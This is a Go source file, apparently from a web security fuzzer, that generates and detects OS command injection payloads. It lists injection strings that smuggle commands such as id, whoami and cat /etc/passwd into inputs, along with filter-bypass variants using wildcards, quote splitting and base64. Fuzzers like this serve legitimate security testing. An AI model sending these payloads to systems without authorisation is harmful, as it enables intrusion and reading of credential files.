package vulns

import (
	"fmt"
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type CMDiModule struct{}

func (m *CMDiModule) Name() string        { return "cmdi" }
func (m *CMDiModule) Description() string { return "OS Command Injection" }

func (m *CMDiModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := cmdiPayloads()
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{Value: p.value, Point: point, Module: "cmdi", Variant: p.variant,
				Metadata: map[string]string{"expected": p.expected}})
		}
	}
	return payloads
}

func (m *CMDiModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	expected := ""
	if payload.Metadata != nil {
		expected = payload.Metadata["expected"]
	}

	// Output detection
	if expected != "" && strings.Contains(respBody, expected) && !strings.Contains(baseBody, expected) {
		return &Finding{
			Module:      "cmdi",
			Severity:    "critical",
			Confidence:  "confirmed",
			Title:       "OS Command Injection — Output em resposta",
			Description: "Command executed on server, output present in response",
			Payload:     payload.Value,
			Point:       payload.Point,
			Evidence:    "Expected output '" + expected + "' found",
			OWASP:       "A03:2021 Injection",
			CWE:         "CWE-78",
		}
	}

	// Time-based
	if strings.Contains(payload.Variant, "time") && respTime-baseTime > 4500 {
		return &Finding{
			Module:      "cmdi",
			Severity:    "critical",
			Confidence:  "high",
			Title:       "OS Command Injection — Time-based",
			Description: "Significant delay detected with sleep payload",
			Payload:     payload.Value,
			Point:       payload.Point,
			Evidence:    fmt.Sprintf("delta=%dms", respTime-baseTime),
			OWASP:       "A03:2021 Injection",
			CWE:         "CWE-78",
		}
	}

	return nil
}

type cmdiPayload struct {
	value    string
	variant  string
	expected string
}

func cmdiPayloads() []cmdiPayload {
	return []cmdiPayload{
		// Linux
		{`;id`, "linux-semicolon", "uid="},
		{`|id`, "linux-pipe", "uid="},
		{`||id`, "linux-or", "uid="},
		{`&&id`, "linux-and", "uid="},
		{"$(id)", "linux-subshell", "uid="},
		{"`id`", "linux-backtick", "uid="},
		{"\nid", "linux-newline", "uid="},
		{`%0aid`, "linux-url-newline", "uid="},
		{`;cat /etc/passwd`, "linux-passwd", "root:x:0:0"},
		{`|cat /etc/passwd`, "linux-passwd-pipe", "root:x:0:0"},
		{"$(cat /etc/passwd)", "linux-passwd-sub", "root:x:0:0"},
		{`;ls -la /`, "linux-ls", "bin"},

		// Time-based Linux
		{`;sleep 5`, "time-linux", ""},
		{`|sleep 5`, "time-linux-pipe", ""},
		{`||sleep 5`, "time-linux-or", ""},
		{"$(sleep 5)", "time-linux-sub", ""},
		{"`sleep 5`", "time-linux-bt", ""},
		{";sleep${IFS}5", "time-linux-ifs", ""},

		// Windows
		{`& whoami`, "windows-and", "\\"},
		{`| whoami`, "windows-pipe", "\\"},
		{`&& whoami`, "windows-dand", "\\"},
		{`|| whoami`, "windows-or", "\\"},
		{`& ping -n 5 127.0.0.1`, "time-windows", ""},
		{`| timeout 5`, "time-windows-timeout", ""},

		// Bypass techniques
		{`;i\d`, "bypass-backslash", "uid="},
		{`;i''d`, "bypass-quotes", "uid="},
		{`;i""d`, "bypass-dquotes", "uid="},
		{";$()i$()d", "bypass-empty-sub", "uid="},
		{";{id,}", "bypass-brace", "uid="},
		{`;/???/i?`, "bypass-wildcard", "uid="},
		{`;/???/??t /???/??ss??`, "bypass-wildcard-cat", "root"},
		{`%0a%0did`, "bypass-crlf", "uid="},
		{`%09id`, "bypass-tab", "uid="},

		// Chained
		{`;id;whoami;uname -a`, "chain-linux", "uid="},
		{`$(echo cHdk | base64 -d)`, "bypass-base64", ""},
	}
}
